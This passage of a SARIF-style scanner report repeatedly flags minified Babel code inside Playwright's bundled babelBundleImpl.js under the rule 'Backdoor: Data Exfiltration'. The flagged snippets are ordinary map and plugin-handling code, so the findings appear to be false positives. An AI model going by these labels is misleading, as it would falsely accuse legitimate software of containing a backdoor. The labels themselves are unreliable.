                      "text": "){a.replaceWith(Kf(vO([],a.node),[]));return}let o=uE(a),l=a.parentPath;if(l.isUpdateExpression({argument:r}))throw e.buildCodeFrameError(\"can't handle update expression\");let u=l.isAssignmentExpression({left:a.node}),c=l.isUnaryExpression({operator:\"delete\"});if(c&&a.isOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.node.optional)break;f=f.get(\"object\");continue}else if(f.isOptionalCallExpression()){if(f.node.optional)break;f=f.get(\"callee\");continue}throw new E",
                      "markdown": "`){a.replaceWith(Kf(vO([],a.node),[]));return}let o=uE(a),l=a.parentPath;if(l.isUpdateExpression({argument:r}))throw e.buildCodeFrameError(\"can't handle update expression\");let u=l.isAssignmentExpression({left:a.node}),c=l.isUnaryExpression({operator:\"delete\"});if(c&&a.isOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.node.optional)break;f=f.get(\"object\");continue}else if(f.isOptionalCallExpression()){if(f.node.optional)break;f=f.get(\"callee\");continue}throw new E`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 7414,
                  "endLine": 1769,
                  "endColumn": 7419,
                  "snippet": {
                    "text": "set(t,r,n){return this._map.set(t,{count:n,value:r})}};function xO(e,t){let{node:r}=e;if(CO(r))return TO(t,r.property,r.computed);if(e.isOptionalCallExpression()){let n=e.get(\"callee\");if(e.node.optional&&n.isOptionalMemberExpression()){let s=n.node.object,i=e.scope.maybeGenerateMemoised(s);return n.get(\"object\").replaceWith(Pa(\"=\",i,s)),Kf(TO(t,AO(\"call\")),[i,...e.node.arguments])}return Kf(t,e.node.arguments)}return e.node}function Wge(e){for(;e&&!e.isProgram();){let{parentPath:t,container:r,listKey:n}=e,s=t.node;if(n){if(r!==s[n])return!0}else if(r!==s)return!0;e=t}return!1}var Kge={memoise(){},",
                    "rendered": {
                      "text": "set(t,r,n){return this._map.set(t,{count:n,value:r})}};function xO(e,t){let{node:r}=e;if(CO(r))return TO(t,r.property,r.computed);if(e.isOptionalCallExpression()){let n=e.get(\"callee\");if(e.node.optional&&n.isOptionalMemberExpression()){let s=n.node.object,i=e.scope.maybeGenerateMemoised(s);return n.get(\"object\").replaceWith(Pa(\"=\",i,s)),Kf(TO(t,AO(\"call\")),[i,...e.node.arguments])}return Kf(t,e.node.arguments)}return e.node}function Wge(e){for(;e&&!e.isProgram();){let{parentPath:t,container:r,listKey:n}=e,s=t.node;if(n){if(r!==s[n])return!0}else if(r!==s)return!0;e=t}return!1}var Kge={memoise(){},",
                      "markdown": "`set(t,r,n){return this._map.set(t,{count:n,value:r})}};function xO(e,t){let{node:r}=e;if(CO(r))return TO(t,r.property,r.computed);if(e.isOptionalCallExpression()){let n=e.get(\"callee\");if(e.node.optional&&n.isOptionalMemberExpression()){let s=n.node.object,i=e.scope.maybeGenerateMemoised(s);return n.get(\"object\").replaceWith(Pa(\"=\",i,s)),Kf(TO(t,AO(\"call\")),[i,...e.node.arguments])}return Kf(t,e.node.arguments)}return e.node}function Wge(e){for(;e&&!e.isProgram();){let{parentPath:t,container:r,listKey:n}=e,s=t.node;if(n){if(r!==s[n])return!0}else if(r!==s)return!0;e=t}return!1}var Kge={memoise(){},`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 7284,
                  "endLine": 1769,
                  "endColumn": 7289,
                  "snippet": {
                    "text": "turn this._map.has(t)}get(t){if(!this.has(t))return;let r=this._map.get(t),{value:n}=r;return r.count--,r.count===0?Pa(\"=\",n,t):n}set(t,r,n){return this._map.set(t,{count:n,value:r})}};function xO(e,t){let{node:r}=e;if(CO(r))return TO(t,r.property,r.computed);if(e.isOptionalCallExpression()){let n=e.get(\"callee\");if(e.node.optional&&n.isOptionalMemberExpression()){let s=n.node.object,i=e.scope.maybeGenerateMemoised(s);return n.get(\"object\").replaceWith(Pa(\"=\",i,s)),Kf(TO(t,AO(\"call\")),[i,...e.node.arguments])}return Kf(t,e.node.arguments)}return e.node}function Wge(e){for(;e&&!e.isProgram();){let{p",
                    "rendered": {
                      "text": "turn this._map.has(t)}get(t){if(!this.has(t))return;let r=this._map.get(t),{value:n}=r;return r.count--,r.count===0?Pa(\"=\",n,t):n}set(t,r,n){return this._map.set(t,{count:n,value:r})}};function xO(e,t){let{node:r}=e;if(CO(r))return TO(t,r.property,r.computed);if(e.isOptionalCallExpression()){let n=e.get(\"callee\");if(e.node.optional&&n.isOptionalMemberExpression()){let s=n.node.object,i=e.scope.maybeGenerateMemoised(s);return n.get(\"object\").replaceWith(Pa(\"=\",i,s)),Kf(TO(t,AO(\"call\")),[i,...e.node.arguments])}return Kf(t,e.node.arguments)}return e.node}function Wge(e){for(;e&&!e.isProgram();){let{p",
                      "markdown": "`turn this._map.has(t)}get(t){if(!this.has(t))return;let r=this._map.get(t),{value:n}=r;return r.count--,r.count===0?Pa(\"=\",n,t):n}set(t,r,n){return this._map.set(t,{count:n,value:r})}};function xO(e,t){let{node:r}=e;if(CO(r))return TO(t,r.property,r.computed);if(e.isOptionalCallExpression()){let n=e.get(\"callee\");if(e.node.optional&&n.isOptionalMemberExpression()){let s=n.node.object,i=e.scope.maybeGenerateMemoised(s);return n.get(\"object\").replaceWith(Pa(\"=\",i,s)),Kf(TO(t,AO(\"call\")),[i,...e.node.arguments])}return Kf(t,e.node.arguments)}return e.node}function Wge(e){for(;e&&!e.isProgram();){let{p`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 7051,
                  "endLine": 1769,
                  "endColumn": 7056,
                  "snippet": {
                    "text": "ge,logicalExpression:Wf,memberExpression:TO,nullLiteral:$f,optionalCallExpression:Vge,optionalMemberExpression:$ge,sequenceExpression:lE,updateExpression:SO}=Fge,cE=class{constructor(){this._map=void 0,this._map=new WeakMap}has(t){return this._map.has(t)}get(t){if(!this.has(t))return;let r=this._map.get(t),{value:n}=r;return r.count--,r.count===0?Pa(\"=\",n,t):n}set(t,r,n){return this._map.set(t,{count:n,value:r})}};function xO(e,t){let{node:r}=e;if(CO(r))return TO(t,r.property,r.computed);if(e.isOptionalCallExpression()){let n=e.get(\"callee\");if(e.node.optional&&n.isOptionalMemberExpression()){let s",
                    "rendered": {
                      "text": "ge,logicalExpression:Wf,memberExpression:TO,nullLiteral:$f,optionalCallExpression:Vge,optionalMemberExpression:$ge,sequenceExpression:lE,updateExpression:SO}=Fge,cE=class{constructor(){this._map=void 0,this._map=new WeakMap}has(t){return this._map.has(t)}get(t){if(!this.has(t))return;let r=this._map.get(t),{value:n}=r;return r.count--,r.count===0?Pa(\"=\",n,t):n}set(t,r,n){return this._map.set(t,{count:n,value:r})}};function xO(e,t){let{node:r}=e;if(CO(r))return TO(t,r.property,r.computed);if(e.isOptionalCallExpression()){let n=e.get(\"callee\");if(e.node.optional&&n.isOptionalMemberExpression()){let s",
                      "markdown": "`ge,logicalExpression:Wf,memberExpression:TO,nullLiteral:$f,optionalCallExpression:Vge,optionalMemberExpression:$ge,sequenceExpression:lE,updateExpression:SO}=Fge,cE=class{constructor(){this._map=void 0,this._map=new WeakMap}has(t){return this._map.has(t)}get(t){if(!this.has(t))return;let r=this._map.get(t),{value:n}=r;return r.count--,r.count===0?Pa(\"=\",n,t):n}set(t,r,n){return this._map.set(t,{count:n,value:r})}};function xO(e,t){let{node:r}=e;if(CO(r))return TO(t,r.property,r.computed);if(e.isOptionalCallExpression()){let n=e.get(\"callee\");if(e.node.optional&&n.isOptionalMemberExpression()){let s`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1767,
                  "startColumn": 185,
                  "endLine": 1767,
                  "endColumn": 190,
                  "snippet": {
                    "text": "mn:a.column+1}},{highlightCode:r});o?i.message=`${n}: `+(0,rge.default)(o[0],a,l,n):i.message=`${n}: ${i.message}\n\n`+l,i.code=\"BABEL_PARSE_ERROR\"}throw i}}});var eO=E(Gb=>{\"use strict\";Object.defineProperty(Gb,\"__esModule\",{value:!0});Gb.default=sge;function Kb(e,t){if(e!==null){if(t.has(e))return t.get(e);let r;if(Array.isArray(e)){r=new Array(e.length),t.set(e,r);for(let n=0;n<e.length;n++)r[n]=typeof e[n]!=\"object\"?e[n]:Kb(e[n],t)}else{r={},t.set(e,r);let n=Object.keys(e);for(let s=0;s<n.length;s++){let i=n[s];r[i]=typeof e[i]!=\"object\"?e[i]:Kb(e[i],t)}}return r}return e}function sge(e){return t",
                    "rendered": {
                      "text": "mn:a.column+1}},{highlightCode:r});o?i.message=`${n}: `+(0,rge.default)(o[0],a,l,n):i.message=`${n}: ${i.message}\n\n`+l,i.code=\"BABEL_PARSE_ERROR\"}throw i}}});var eO=E(Gb=>{\"use strict\";Object.defineProperty(Gb,\"__esModule\",{value:!0});Gb.default=sge;function Kb(e,t){if(e!==null){if(t.has(e))return t.get(e);let r;if(Array.isArray(e)){r=new Array(e.length),t.set(e,r);for(let n=0;n<e.length;n++)r[n]=typeof e[n]!=\"object\"?e[n]:Kb(e[n],t)}else{r={},t.set(e,r);let n=Object.keys(e);for(let s=0;s<n.length;s++){let i=n[s];r[i]=typeof e[i]!=\"object\"?e[i]:Kb(e[i],t)}}return r}return e}function sge(e){return t",
                      "markdown": "`mn:a.column+1}},{highlightCode:r});o?i.message=`${n}: `+(0,rge.default)(o[0],a,l,n):i.message=`${n}: ${i.message}\n\n`+l,i.code=\"BABEL_PARSE_ERROR\"}throw i}}});var eO=E(Gb=>{\"use strict\";Object.defineProperty(Gb,\"__esModule\",{value:!0});Gb.default=sge;function Kb(e,t){if(e!==null){if(t.has(e))return t.get(e);let r;if(Array.isArray(e)){r=new Array(e.length),t.set(e,r);for(let n=0;n<e.length;n++)r[n]=typeof e[n]!=\"object\"?e[n]:Kb(e[n],t)}else{r={},t.set(e,r);let n=Object.keys(e);for(let s=0;s<n.length;s++){let i=n[s];r[i]=typeof e[i]!=\"object\"?e[i]:Kb(e[i],t)}}return r}return e}function sge(e){return t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1750,
                  "startColumn": 2530,
                  "endLine": 1750,
                  "endColumn": 2535,
                  "snippet": {
                    "text": "!0});Lf.default=void 0;var pl=class{constructor(t,r,n){this._map=new Map,this.key=void 0,this.file=void 0,this.opts=void 0,this.cwd=void 0,this.filename=void 0,this.key=r,this.file=t,this.opts=n||{},this.cwd=t.opts.cwd,this.filename=t.opts.filename}set(t,r){this._map.set(t,r)}get(t){return this._map.get(t)}availableHelper(t,r){return this.file.availableHelper(t,r)}addHelper(t){return this.file.addHelper(t)}buildCodeFrameError(t,r,n){return this.file.buildCodeFrameError(t,r,n)}};Lf.default=pl;pl.prototype.getModuleName=function(){return this.file.getModuleName()},pl.prototype.addImport=function(){th",
                    "rendered": {
                      "text": "!0});Lf.default=void 0;var pl=class{constructor(t,r,n){this._map=new Map,this.key=void 0,this.file=void 0,this.opts=void 0,this.cwd=void 0,this.filename=void 0,this.key=r,this.file=t,this.opts=n||{},this.cwd=t.opts.cwd,this.filename=t.opts.filename}set(t,r){this._map.set(t,r)}get(t){return this._map.get(t)}availableHelper(t,r){return this.file.availableHelper(t,r)}addHelper(t){return this.file.addHelper(t)}buildCodeFrameError(t,r,n){return this.file.buildCodeFrameError(t,r,n)}};Lf.default=pl;pl.prototype.getModuleName=function(){return this.file.getModuleName()},pl.prototype.addImport=function(){th",
                      "markdown": "`!0});Lf.default=void 0;var pl=class{constructor(t,r,n){this._map=new Map,this.key=void 0,this.file=void 0,this.opts=void 0,this.cwd=void 0,this.filename=void 0,this.key=r,this.file=t,this.opts=n||{},this.cwd=t.opts.cwd,this.filename=t.opts.filename}set(t,r){this._map.set(t,r)}get(t){return this._map.get(t)}availableHelper(t,r){return this.file.availableHelper(t,r)}addHelper(t){return this.file.addHelper(t)}buildCodeFrameError(t,r,n){return this.file.buildCodeFrameError(t,r,n)}};Lf.default=pl;pl.prototype.getModuleName=function(){return this.file.getModuleName()},pl.prototype.addImport=function(){th`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1747,
                  "startColumn": 884,
                  "endLine": 1747,
                  "endColumn": 889,
                  "snippet": {
                    "text": "delete t.ignore,delete t.only,delete t.test,delete t.include,delete t.exclude,hasOwnProperty.call(t,\"sourceMap\")&&(t.sourceMaps=t.sourceMap,delete t.sourceMap),t}function wf(e){let t=new Map,r=[];for(let n of e)if(typeof n.value==\"function\"){let s=n.value,i=t.get(s);i||(i=new Map,t.set(s,i));let a=i.get(n.name);a?a.value=n:(a={value:n},r.push(a),n.ownPass||i.set(n.name,a))}else r.push({value:n});return r.reduce((n,s)=>(n.push(s.value),n),[])}function Af({options:e},t,r,n){return(e.test===void 0||mb(r,e.test,t,n))&&(e.include===void 0||mb(r,e.include,t,n))&&(e.exclude===void 0||!mb(r,e.exclude,t,n))",
                    "rendered": {
                      "text": "delete t.ignore,delete t.only,delete t.test,delete t.include,delete t.exclude,hasOwnProperty.call(t,\"sourceMap\")&&(t.sourceMaps=t.sourceMap,delete t.sourceMap),t}function wf(e){let t=new Map,r=[];for(let n of e)if(typeof n.value==\"function\"){let s=n.value,i=t.get(s);i||(i=new Map,t.set(s,i));let a=i.get(n.name);a?a.value=n:(a={value:n},r.push(a),n.ownPass||i.set(n.name,a))}else r.push({value:n});return r.reduce((n,s)=>(n.push(s.value),n),[])}function Af({options:e},t,r,n){return(e.test===void 0||mb(r,e.test,t,n))&&(e.include===void 0||mb(r,e.include,t,n))&&(e.exclude===void 0||!mb(r,e.exclude,t,n))",
                      "markdown": "`delete t.ignore,delete t.only,delete t.test,delete t.include,delete t.exclude,hasOwnProperty.call(t,\"sourceMap\")&&(t.sourceMaps=t.sourceMap,delete t.sourceMap),t}function wf(e){let t=new Map,r=[];for(let n of e)if(typeof n.value==\"function\"){let s=n.value,i=t.get(s);i||(i=new Map,t.set(s,i));let a=i.get(n.name);a?a.value=n:(a={value:n},r.push(a),n.ownPass||i.set(n.name,a))}else r.push({value:n});return r.reduce((n,s)=>(n.push(s.value),n),[])}function Af({options:e},t,r,n){return(e.test===void 0||mb(r,e.test,t,n))&&(e.include===void 0||mb(r,e.include,t,n))&&(e.exclude===void 0||!mb(r,e.exclude,t,n))`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1747,
                  "startColumn": 843,
                  "endLine": 1747,
                  "endColumn": 848,
                  "snippet": {
                    "text": ",delete t.presets,delete t.passPerPreset,delete t.ignore,delete t.only,delete t.test,delete t.include,delete t.exclude,hasOwnProperty.call(t,\"sourceMap\")&&(t.sourceMaps=t.sourceMap,delete t.sourceMap),t}function wf(e){let t=new Map,r=[];for(let n of e)if(typeof n.value==\"function\"){let s=n.value,i=t.get(s);i||(i=new Map,t.set(s,i));let a=i.get(n.name);a?a.value=n:(a={value:n},r.push(a),n.ownPass||i.set(n.name,a))}else r.push({value:n});return r.reduce((n,s)=>(n.push(s.value),n),[])}function Af({options:e},t,r,n){return(e.test===void 0||mb(r,e.test,t,n))&&(e.include===void 0||mb(r,e.include,t,n))&&(",
                    "rendered": {
                      "text": ",delete t.presets,delete t.passPerPreset,delete t.ignore,delete t.only,delete t.test,delete t.include,delete t.exclude,hasOwnProperty.call(t,\"sourceMap\")&&(t.sourceMaps=t.sourceMap,delete t.sourceMap),t}function wf(e){let t=new Map,r=[];for(let n of e)if(typeof n.value==\"function\"){let s=n.value,i=t.get(s);i||(i=new Map,t.set(s,i));let a=i.get(n.name);a?a.value=n:(a={value:n},r.push(a),n.ownPass||i.set(n.name,a))}else r.push({value:n});return r.reduce((n,s)=>(n.push(s.value),n),[])}function Af({options:e},t,r,n){return(e.test===void 0||mb(r,e.test,t,n))&&(e.include===void 0||mb(r,e.include,t,n))&&(",
                      "markdown": "`,delete t.presets,delete t.passPerPreset,delete t.ignore,delete t.only,delete t.test,delete t.include,delete t.exclude,hasOwnProperty.call(t,\"sourceMap\")&&(t.sourceMaps=t.sourceMap,delete t.sourceMap),t}function wf(e){let t=new Map,r=[];for(let n of e)if(typeof n.value==\"function\"){let s=n.value,i=t.get(s);i||(i=new Map,t.set(s,i));let a=i.get(n.name);a?a.value=n:(a={value:n},r.push(a),n.ownPass||i.set(n.name,a))}else r.push({value:n});return r.reduce((n,s)=>(n.push(s.value),n),[])}function Af({options:e},t,r,n){return(e.test===void 0||mb(r,e.test,t,n))&&(e.include===void 0||mb(r,e.include,t,n))&&(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1731,
                  "startColumn": 5106,
                  "endLine": 1731,
                  "endColumn": 5111,
                  "snippet": {
                    "text": ".`);if(c!==null&&typeof l==\"object\"&&l)throw new Error(`Plugin/Preset files are not allowed to export objects, only functions. In ${c}`);return{name:a,alias:c||n,value:l,options:o,dirname:t,ownPass:s,file:u}}function nye(e){let t=new Map;for(let r of e){if(typeof r.value!=\"function\")continue;let n=t.get(r.value);if(n||(n=new Set,t.set(r.value,n)),n.has(r.name)){let s=e.filter(i=>i.value===r.value);throw new Error([\"Duplicate plugin/preset detected.\",\"If you'd like to use two separate instances of a plugin,\",\"they need separate names, e.g.\",\"\",\"  plugins: [\",\"    ['some-plugin', {}],\",\"    ['some-pl",
                    "rendered": {
                      "text": ".`);if(c!==null&&typeof l==\"object\"&&l)throw new Error(`Plugin/Preset files are not allowed to export objects, only functions. In ${c}`);return{name:a,alias:c||n,value:l,options:o,dirname:t,ownPass:s,file:u}}function nye(e){let t=new Map;for(let r of e){if(typeof r.value!=\"function\")continue;let n=t.get(r.value);if(n||(n=new Set,t.set(r.value,n)),n.has(r.name)){let s=e.filter(i=>i.value===r.value);throw new Error([\"Duplicate plugin/preset detected.\",\"If you'd like to use two separate instances of a plugin,\",\"they need separate names, e.g.\",\"\",\"  plugins: [\",\"    ['some-plugin', {}],\",\"    ['some-pl",
                      "markdown": "`.`);if(c!==null&&typeof l==\"object\"&&l)throw new Error(`Plugin/Preset files are not allowed to export objects, only functions. In ${c}`);return{name:a,alias:c||n,value:l,options:o,dirname:t,ownPass:s,file:u}}function nye(e){let t=new Map;for(let r of e){if(typeof r.value!=\"function\")continue;let n=t.get(r.value);if(n||(n=new Set,t.set(r.value,n)),n.has(r.name)){let s=e.filter(i=>i.value===r.value);throw new Error([\"Duplicate plugin/preset detected.\",\"If you'd like to use two separate instances of a plugin,\",\"they need separate names, e.g.\",\"\",\"  plugins: [\",\"    ['some-plugin', {}],\",\"    ['some-pl`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1731,
                  "startColumn": 3720,
                  "endLine": 1731,
                  "endColumn": 3725,
                  "snippet": {
                    "text": "D(Qme,a))}))}),eye=new WeakMap,tye=(0,rl.makeWeakCacheSync)((e,t)=>{let r=t.using(n=>n);return(0,rl.makeStrongCache)(function*(n){return(yield*ZD(e,r,n)).map(i=>zD(eye,i))})}),rye={};function zD(e,t){let{value:r,options:n=rye}=t;if(n===!1)return t;let s=e.get(r);s||(s=new WeakMap,e.set(r,s));let i=s.get(n);if(i||(i=[],s.set(n,i)),i.indexOf(t)===-1){let a=i.filter(o=>Xme(o,t));if(a.length>0)return a[0];i.push(t)}return t}function*QD(e,t,r,n){return yield*eI(\"preset\",e,t,r,n)}function*ZD(e,t,r){return yield*eI(\"plugin\",e,t,r)}function*eI(e,t,r,n,s){let i=yield*XD().all(t.map((a,o)=>tI(a,r,{type:e,ali",
                    "rendered": {
                      "text": "D(Qme,a))}))}),eye=new WeakMap,tye=(0,rl.makeWeakCacheSync)((e,t)=>{let r=t.using(n=>n);return(0,rl.makeStrongCache)(function*(n){return(yield*ZD(e,r,n)).map(i=>zD(eye,i))})}),rye={};function zD(e,t){let{value:r,options:n=rye}=t;if(n===!1)return t;let s=e.get(r);s||(s=new WeakMap,e.set(r,s));let i=s.get(n);if(i||(i=[],s.set(n,i)),i.indexOf(t)===-1){let a=i.filter(o=>Xme(o,t));if(a.length>0)return a[0];i.push(t)}return t}function*QD(e,t,r,n){return yield*eI(\"preset\",e,t,r,n)}function*ZD(e,t,r){return yield*eI(\"plugin\",e,t,r)}function*eI(e,t,r,n,s){let i=yield*XD().all(t.map((a,o)=>tI(a,r,{type:e,ali",
                      "markdown": "`D(Qme,a))}))}),eye=new WeakMap,tye=(0,rl.makeWeakCacheSync)((e,t)=>{let r=t.using(n=>n);return(0,rl.makeStrongCache)(function*(n){return(yield*ZD(e,r,n)).map(i=>zD(eye,i))})}),rye={};function zD(e,t){let{value:r,options:n=rye}=t;if(n===!1)return t;let s=e.get(r);s||(s=new WeakMap,e.set(r,s));let i=s.get(n);if(i||(i=[],s.set(n,i)),i.indexOf(t)===-1){let a=i.filter(o=>Xme(o,t));if(a.length>0)return a[0];i.push(t)}return t}function*QD(e,t,r,n){return yield*eI(\"preset\",e,t,r,n)}function*ZD(e,t,r){return yield*eI(\"plugin\",e,t,r)}function*eI(e,t,r,n,s){let i=yield*XD().all(t.map((a,o)=>tI(a,r,{type:e,ali`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1731,
                  "startColumn": 3675,
                  "endLine": 1731,
                  "endColumn": 3680,
                  "snippet": {
                    "text": "nction*(s){return(yield*QD(e,r,n,s)).map(a=>zD(Qme,a))}))}),eye=new WeakMap,tye=(0,rl.makeWeakCacheSync)((e,t)=>{let r=t.using(n=>n);return(0,rl.makeStrongCache)(function*(n){return(yield*ZD(e,r,n)).map(i=>zD(eye,i))})}),rye={};function zD(e,t){let{value:r,options:n=rye}=t;if(n===!1)return t;let s=e.get(r);s||(s=new WeakMap,e.set(r,s));let i=s.get(n);if(i||(i=[],s.set(n,i)),i.indexOf(t)===-1){let a=i.filter(o=>Xme(o,t));if(a.length>0)return a[0];i.push(t)}return t}function*QD(e,t,r,n){return yield*eI(\"preset\",e,t,r,n)}function*ZD(e,t,r){return yield*eI(\"plugin\",e,t,r)}function*eI(e,t,r,n,s){let i=y",
                    "rendered": {
                      "text": "nction*(s){return(yield*QD(e,r,n,s)).map(a=>zD(Qme,a))}))}),eye=new WeakMap,tye=(0,rl.makeWeakCacheSync)((e,t)=>{let r=t.using(n=>n);return(0,rl.makeStrongCache)(function*(n){return(yield*ZD(e,r,n)).map(i=>zD(eye,i))})}),rye={};function zD(e,t){let{value:r,options:n=rye}=t;if(n===!1)return t;let s=e.get(r);s||(s=new WeakMap,e.set(r,s));let i=s.get(n);if(i||(i=[],s.set(n,i)),i.indexOf(t)===-1){let a=i.filter(o=>Xme(o,t));if(a.length>0)return a[0];i.push(t)}return t}function*QD(e,t,r,n){return yield*eI(\"preset\",e,t,r,n)}function*ZD(e,t,r){return yield*eI(\"plugin\",e,t,r)}function*eI(e,t,r,n,s){let i=y",
                      "markdown": "`nction*(s){return(yield*QD(e,r,n,s)).map(a=>zD(Qme,a))}))}),eye=new WeakMap,tye=(0,rl.makeWeakCacheSync)((e,t)=>{let r=t.using(n=>n);return(0,rl.makeStrongCache)(function*(n){return(yield*ZD(e,r,n)).map(i=>zD(eye,i))})}),rye={};function zD(e,t){let{value:r,options:n=rye}=t;if(n===!1)return t;let s=e.get(r);s||(s=new WeakMap,e.set(r,s));let i=s.get(n);if(i||(i=[],s.set(n,i)),i.indexOf(t)===-1){let a=i.filter(o=>Xme(o,t));if(a.length>0)return a[0];i.push(t)}return t}function*QD(e,t,r,n){return yield*eI(\"preset\",e,t,r,n)}function*ZD(e,t,r){return yield*eI(\"plugin\",e,t,r)}function*eI(e,t,r,n,s){let i=y`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1731,
                  "startColumn": 567,
                  "endLine": 1731,
                  "endColumn": 572,
                  "snippet": {
                    "text": "leasedVersion)(t,e)?t.toLowerCase():$D(e,t);return[e,r]}function Ume(e){let t=Object.assign({},e);return delete t.esmodules,delete t.browsers,t}function Vme(e,t){let r=MD(e,{mobileToDesktop:!0,env:t});return Lme(r)}var LD=new Nme({max:64});function $me(e,t){let r=typeof e==\"string\"?e:e.join()+t,n=LD.get(r);return n||(n=Vme(e,t),LD.set(r,n)),Object.assign({},n)}function Wme(e={},t={}){var r,n;let{browsers:s,esmodules:i}=e,{configPath:a=\".\"}=t;jme(s);let o=Ume(e),l=Fme(o),c=!!s||Object.keys(l).length>0,f=!t.ignoreBrowserslistConfig&&!c;if(!s&&f&&(s=MD.loadConfig({config:t.configFile,path:a,env:t.brow",
                    "rendered": {
